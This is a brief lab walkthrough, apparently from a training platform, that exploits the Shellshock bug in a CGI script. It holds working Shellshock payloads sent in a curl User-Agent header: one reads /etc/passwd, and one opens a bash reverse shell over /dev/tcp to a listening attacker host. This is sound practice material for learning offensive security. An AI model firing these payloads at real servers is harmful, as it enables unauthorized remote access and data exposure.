# [Attacking Common Gateway Interface (CGI) Applications - Shellshock](Attacking%20Common%20Gateway%20Interface%20(CGI)%20Applications%20-%20Shellshock.md)
### Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of the flag.txt file located on the server.

Firstly, i'll enumerate the host
```shell
gobuster dir -u http://10.129.205.27:80/cgi-bin -w /usr/share/wordlists/dirb/small.txt -x cgi
```
![](Screenshot%202026-08-02%20at%2011.51.19.png)

Then i confirmed the vulnerability by using the command below
```shell
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
```

It returned to me
![](Screenshot%202026-08-02%20at%2011.53.39.png)

Next im gonna initiate the netcat listener on the port `8443` to exploit the rshell
```shell
nc -lvnp 8443
```

One-liner Reverse Shell
```shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.143/8443 0>&1' http://10.129.205.27/cgi-bin/access.cgi
```
![](Screenshot%202026-08-02%20at%2011.56.03.png)
![](Screenshot%202026-08-02%20at%2011.56.14.png)
